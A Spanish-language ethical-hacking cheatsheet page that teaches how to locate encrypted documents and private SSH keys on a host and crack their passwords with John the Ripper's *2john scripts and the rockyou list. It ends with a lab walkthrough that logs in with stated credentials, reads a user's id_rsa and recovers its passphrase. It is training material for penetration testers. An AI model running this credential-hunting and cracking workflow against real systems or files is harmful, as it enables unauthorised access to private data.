
# Archivos Protegidos

En el uso del cifrado de archivos a menudo todavía falta `privacidad` y es importante para las empresas. Incluso hoy en día, los correos electrónicos que contienen solicitudes de empleo, estados de cuenta o contratos suelen enviarse sin cifrar. Esto es una negligencia grave y, en muchos casos, incluso penado por la ley. Por ejemplo, el RGPD exige el almacenamiento y la transmisión cifrados de datos personales en la Unión Europea. Especialmente en los casos empresariales, esto es bastante diferente en el caso de los correos electrónicos. Hoy en día es bastante común comunicar `temas confidenciales` o enviar `datos sensibles` `por email`. Sin embargo, los correos electrónicos no son mucho más seguros que las postales, que pueden ser interceptadas si el atacante está posicionado correctamente.

Cada vez más empresas están aumentando sus precauciones e infraestructura de seguridad de TI a través de cursos de capacitación y seminarios de concientización sobre seguridad. Como resultado, cada vez es más común que los empleados de la empresa cifren/codifiquen archivos confidenciales. Sin embargo, incluso estos pueden descifrarse y leerse con la elección correcta de listas y herramientas. En muchos casos, la `encryptación simétrica` cómo `AES-256`se utiliza para almacenar de forma segura archivos o carpetas individuales. Aquí, `la misma clave` se utiliza para cifrar y descifrar un archivo.

Por lo tanto, para enviar archivos se utiliza cifrado asimétrico, en el que se requieren dos claves independientes. El remitente cifra el archivo con la clave pública del destinatario. El destinatario, a su vez, puede descifrar el archivo utilizando una clave privada.

***

## <mark style="color:purple;">Buscando archivos codificados</mark>

Muchas extensiones de archivos diferentes pueden identificar estos tipos de archivos cifrados/codificados. Por ejemplo, se puede encontrar una lista útil en [FileInfo](https://fileinfo.com/filetypes/encoded) . Sin embargo, para nuestro ejemplo, solo veremos los archivos más comunes como los siguientes:

**Buscando archivos**

```shell-session
cry0l1t3@unixclient:~$ for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

File extension:  .xls

File extension:  .xls*

File extension:  .xltx

File extension:  .csv
/home/cry0l1t3/Docs/client-emails.csv
/home/cry0l1t3/ruby-2.7.3/gems/test-unit-3.3.4/test/fixtures/header-label.csv
/home/cry0l1t3/ruby-2.7.3/gems/test-unit-3.3.4/test/fixtures/header.csv
/home/cry0l1t3/ruby-2.7.3/gems/test-unit-3.3.4/test/fixtures/no-header.csv
/home/cry0l1t3/ruby-2.7.3/gems/test-unit-3.3.4/test/fixtures/plus.csv
/home/cry0l1t3/ruby-2.7.3/test/win32ole/orig_data.csv

File extension:  .od*
/home/cry0l1t3/Docs/document-temp.odt
/home/cry0l1t3/Docs/product-improvements.odp
/home/cry0l1t3/Docs/mgmt-spreadsheet.ods
...SNIP...
```

Si encontramos extensiones de archivos en el sistema con las que no estamos familiarizados, podemos utilizar los motores de búsqueda con los que estamos familiarizados para descubrir la tecnología detrás de ellas. Después de todo, hay cientos de extensiones de archivos diferentes y no se espera que nadie las sepa todas de memoria. Sin embargo, primero debemos saber cómo encontrar la información relevante que nos ayudará. Nuevamente, podemos seguir los pasos que ya cubrimos en las secciones de `Credential Hunting en` [`Linux`](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/password-attacks/linux-attacks/credential-hunting-linux.md) `y` [`Windows`](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/password-attacks/windows-attacks/credential-hunting-windows.md) o repetirlos para encontrar claves SSH en el sistema.

**Buscando claves SSH**

```shell-session
cry0l1t3@unixclient:~$ grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"

/home/cry0l1t3/.ssh/internal_db:1:-----BEGIN OPENSSH PRIVATE KEY-----
/home/cry0l1t3/.ssh/SSH.private:1:-----BEGIN OPENSSH PRIVATE KEY-----
/home/cry0l1t3/Mgmt/ceil.key:1:-----BEGIN OPENSSH PRIVATE KEY-----
```

La mayoría de claves SSH que encontraremos hoy en día están cifradas. Podemos reconocer esto por el encabezado de la clave SSH porque muestra el método de cifrado en uso.

**Claves SSH cifradas**

```shell-session
cry0l1t3@unixclient:~$ cat /home/cry0l1t3/.ssh/SSH.private

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2109D25CC91F8DBFCEB0F7589066B2CC

8Uboy0afrTahejVGmB7kgvxkqJLOczb1I0/hEzPU1leCqhCKBlxYldM2s65jhflD
4/OH4ENhU7qpJ62KlrnZhFX8UwYBmebNDvG12oE7i21hB/9UqZmmHktjD3+OYTsD
...SNIP...
```

Si vemos un encabezado de este tipo en una clave SSH, en la mayoría de los casos no podremos usarlo inmediatamente sin realizar más acciones. Esto se debe a que las claves SSH cifradas están protegidas con una frase de contraseña que se debe ingresar antes de usarlas. Sin embargo, muchos suelen ser descuidados en la selección de la contraseña y su complejidad porque SSH se considera un protocolo seguro, y muchos no saben que incluso el ligero [AES-128-CBC](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard) se puede descifrar.

***

## <mark style="color:purple;">Cracking de archivos con John</mark>

`John The Ripper` tiene muchos scripts diferentes para generar hashes a partir de archivos que luego podemos usar para descifrar. Podemos encontrar estos scripts en nuestro sistema usando el siguiente comando:

```
locate *2john*
```

### **Scripts de John para Hashing**

```shell-session
afsh4ck@kali$ locate *2john*

/usr/bin/bitlocker2john
/usr/bin/dmg2john
/usr/bin/gpg2john
/usr/bin/hccap2john
/usr/bin/keepass2john
/usr/bin/putty2john
/usr/bin/racf2john
/usr/bin/rar2john
/usr/bin/uaf2john
/usr/bin/vncpcap2john
/usr/bin/wlanhcx2john
/usr/bin/wpapcap2john
/usr/bin/zip2john
/usr/share/john/1password2john.py
/usr/share/john/7z2john.pl
/usr/share/john/DPAPImk2john.py
/usr/share/john/adxcsouf2john.py
/usr/share/john/aem2john.py
/usr/share/john/aix2john.pl
/usr/share/john/aix2john.py
/usr/share/john/andotp2john.py
/usr/share/john/androidbackup2john.py
...SNIP...
```

Podemos convertir muchos formatos diferentes en hashes únicos e intentar descifrar las contraseñas con esto. Luego, podremos abrir, leer y usar el archivo si lo logramos. Existe un script de Python llamado `ssh2john.py` para claves SSH, que genera los hashes correspondientes para las claves SSH cifradas, que luego podemos almacenar en archivos.

```shell-session
afsh4ck@kali$ ssh2john SSH.private > ssh.hash
afsh4ck@kali$ cat ssh.hash 

ssh.private:$sshng$0$8$1C258238FD2D6EB0$2352$f7b...SNIP...
```

A continuación, debemos personalizar los comandos de acuerdo con la lista de contraseñas y especificar nuestro archivo con los hashes como el objetivo a descifrar. Después de eso, podemos mostrar los hash descifrados especificando el archivo hash y usando la opción `--show`.

### **Cracking de claves SSH**

```shell-session
afsh4ck@kali$ john --wordlist=rockyou.txt ssh.hash

Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
1234         (SSH.private)
1g 0:00:00:00 DONE (2022-02-08 03:03) 16.66g/s 1747Kp/s 1747Kc/s 1747KC/s Knightsing..Babying
Session completed
```

```shell-session
afsh4ck@kali$ john ssh.hash --show

SSH.private:1234

1 password hash cracked, 0 left
```

***

## <mark style="color:purple;">Crackeando documentos</mark>

A lo largo de nuestra carrera nos encontraremos con muchos documentos diferentes, que además están protegidos con contraseña para evitar el acceso de personas no autorizadas. Hoy en día, la mayoría de la gente utiliza archivos Office y PDF para intercambiar información y datos comerciales.

Prácticamente todos los informes, documentación y hojas de información se pueden encontrar en forma de documentos DOC y PDF de Office. Esto se debe a que ofrecen la mejor representación visual de la información. John proporciona un script de Python llamado `office2john.py` para extraer hashes de todos los documentos comunes de Office que luego se pueden introducir en John o Hashcat para descifrarlos sin conexión. El procedimiento para descifrarlos sigue siendo el mismo.

### **Cracking de documentos de Microsoft Office**

```shell-session
afsh4ck@kali$ office2john Protected.docx > protected-docx.hash
afsh4ck@kali$ cat protected-docx.hash

Protected.docx:$office$*2007*20*128*16*7240...SNIP...8a69cf1*98242f4da37d916305d8e2821360773b7edc481b
```

```shell-session
afsh4ck@kali$ john --wordlist=/usr/share/wordlists/rockyou.txt protected-docx.hash

Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 256/256 AVX2 8x / SHA512 256/256 AVX2 4x AES])
Cost 1 (MS Office version) is 2007 for all loaded hashes
Cost 2 (iteration count) is 50000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
1234             (Protected.docx)
1g 0:00:00:00 DONE (2022-02-08 01:25) 2.083g/s 2266p/s 2266c/s 2266C/s trisha..heart
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

```shell-session
afsh4ck@kali$ john protected-docx.hash --show

Protected.docx:1234
```

### **Cracking de archivos PDF**

```shell-session
afsh4ck@kali$ pdf2john PDF.pdf > pdf.hash
afsh4ck@kali$ cat pdf.hash 

PDF.pdf:$pdf$2*3*128*-1028*1*16*7e88...SNIP...bd2*32*a72092...SNIP...0000*32*c48f001fdc79a030d718df5dbbdaad81d1f6fedec4a7b5cd980d64139edfcb7e
```

```shell-session
afsh4ck@kali$ john --wordlist=/usr/share/wordlists/rockyou.txt pdf.hash

Using default input encoding: UTF-8
Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])
Cost 1 (revision) is 3 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
1234             (PDF.pdf)
1g 0:00:00:00 DONE (2022-02-08 02:16) 25.00g/s 27200p/s 27200c/s 27200C/s bulldogs..heart
Use the "--show --format=PDF" options to display all of the cracked passwords reliably
Session completed
```

```shell-session
afsh4ck@kali$ john pdf.hash --show

PDF.pdf:1234

1 password hash cracked, 0 left
```

Una de las mayores dificultades en este proceso es la generación y mutación de listas de contraseñas. Este es el requisito previo para descifrar con éxito las contraseñas de todos los archivos y puntos de acceso protegidos con contraseña. Esto se debe a que en la mayoría de los casos ya no es suficiente utilizar una lista de contraseñas conocidas, ya que éstas son conocidas por los sistemas y a menudo son reconocidas y bloqueadas por mecanismos de seguridad integrados.

Este tipo de archivos pueden ser más difíciles de descifrar (o no ser descifrables en absoluto en un período de tiempo razonable) porque los usuarios pueden verse obligados a seleccionar una contraseña o frase de contraseña más larga, generada aleatoriamente. Sin embargo, siempre vale la pena intentar descifrar documentos protegidos con contraseña, ya que pueden proporcionar datos confidenciales que podrían ser útiles para mejorar nuestro acceso.

***

## <mark style="color:purple;">Caso práctico</mark>

> Utiliza la contraseña que ya hemos descubierto en la sección anterior del usuario Kira, inicia sesión en el host y descifra la clave SSH "id\_rsa". Luego, envíe la contraseña de la clave SSH como respuesta.

### Credenciales de acceso por SSH

```
User: kira
Pass: L0vey0u1!
Host: 10.129.219.191
```

### Conexión por SSH

```shell-session
ssh kira@10.129.219.191            
kira@10.129.219.191's password: L0vey0u1!
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-99-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 18 Apr 2024 02:08:03 PM UTC

  System load:  0.04               Processes:               180
  Usage of /:   27.8% of 13.72GB   Users logged in:         0
  Memory usage: 30%                IPv4 address for ens192: 10.129.219.191
  Swap usage:   0%

0 updates can be applied immediately.

The list of available updates is more than a week old.
To check for new updates run: sudo apt update

kira@nix01:~$ 
```

### Búsqueda de Claves Privadas ID\_RSA

<pre class="language-shell-session"><code class="lang-shell-session">kira@nix01:~$ grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"
<strong>
</strong><strong>/home/kira/.ssh/id_rsa:1:-----BEGIN RSA PRIVATE KEY-----
</strong>/home/kira/.bash_history:35:grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"
</code></pre>

La clave que nos interesa es `id_rsa`:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>kira@nix01:~$ cat /home/kira/.ssh/id_rsa
</strong>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,F1C2E21F3CF7BDF460FB56C7D16911F2

sqXnpt6fN4Ugi545CGyPWgfkaQhkDt5lKU6azI4amQ9mifdUkKzdR46EdrU3Pglh
xz3sC+Xdm7qkrtLEQ7rpk8w7zANcsxvQznGspuUv+c1hSvJdVgZAqTG84KFmUpXM
2YW9QdMynHy9PVJP66tKBfuzJ9YZBJISocUjpwtEqrWDnOSBinLsYj6Z+J+yIvLv
1IaFtgGJbqWovJ+5FP9L8Js/AdWRs0fnGzvHYo8h9rJXgf6Qdf7okSsN+pRTPpBe
Dc/IUMwcTUdzyRIMdoz5CsZJGe6jaKYoOt66dU92XjKzHG4yhIeord7+wa1W6MRd
aa2fvvi1SMtaaLFCb6nd8raqoaELPzwcrYQ0cLCwlwggH+GTW/cfVAABnE0kXCgH
sp2uc/KOV6PPdZ6tBFEg/xVehP9H19jd/LfVQ3/tjvKhTNuiF0JcwObiy3d4tpX1
EoUqJHS7s4pQhXmufAxcJGjOo/Ipts9StTwVbDdwmlbA4CkwtS5yPJz2b2BZAUDh
G8OWtKSJm9aKYt0DrLbo5OVeyepg2NP7rRq9OjhHau6L9GrrvcQxvTx6D7PEQb+v
wvKtEW4cZDgk3gvSaWgTf0c5baw0FqYcfr/yVmBidfjtWPIg1eDSQHgWDrAChujr
sMgPL32Wf7AmiUZDlB/5XwX0D+Hn+UTobpFnJ/MBUSay4HUMaQznBQR99csiXIQl
&#x3C;-------SNIP------->

-----END RSA PRIVATE KEY-----
</code></pre>

Nos vamos a copiar este archivo es nuestra máquina de atacante y vamos a crackearlo con John the Ripper. Lo hemos guardado con el nombre `kira_id_rsa`

### SSH2John

{% code overflow="wrap" %}

```shell-session
afsh4ck@kali$ ssh2john kira_id_rsa > ssh.hash

afsh4ck@kali$ cat ssh.hash                                       
kira_id_rsa:$sshng$1$16$F1C2E21F3CF7BDF460FB56C7D16911F2$1776$b2a5e7a6de9f3785208b9e39086c8f5a07e46908640ede65294e9acc8e1a990f6689f75490acdd478e8476b5373e0961c73dec0be5dd9bbaa4aed2c443bae993cc3bcc035cb31bd0ce71aca6e52ff9cd614af25d560640a931bce0a1665295ccd985bd41d3329c7cbd3d524febab4a05fbb327d619049212a1c523a70b44aab5839ce4818a72ec623e99f8....
```

{% endcode %}

### Cracking con John

```shell-session
afsh4ck@kali$ john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
L0veme           (kira_id_rsa)     

Session completed.
```

Finalmente obtenemos la contraseña: `L0veme`
